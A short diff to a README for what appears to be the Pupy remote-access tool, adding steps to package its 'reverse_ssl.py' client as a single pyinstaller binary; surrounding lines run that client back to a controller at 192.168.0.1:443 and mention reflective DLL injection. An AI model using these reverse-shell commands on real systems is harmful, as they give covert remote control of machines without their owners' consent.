@@ -47,11 +47,19 @@ you can also use -t dll_x86 or dll_x64 to generate a reflective DLL and inject/l
 pip install rpyc #(or manually copy it if you are not admin)
 python reverse_ssl.py 192.168.0.1:443
 ```
+you can also build a single binary with pyinstaller :
+```bash
+pyinstaller --onefile /full_path/pupy/client/reverse_ssl.py
+```
 
 #### for MAC OS X
 ```bash
 easy_install rpyc #(or manually copy it if you are not admin)
 python reverse_ssl.py 192.168.0.1:443
+```
+you can also build a single binary with pyinstaller (but you can't "cross-compile", pyinstaller currently only support this from osx):
+```bash
+pyinstaller --onefile /full_path/pupy/client/reverse_ssl.py
 ```
 
 ### start the server
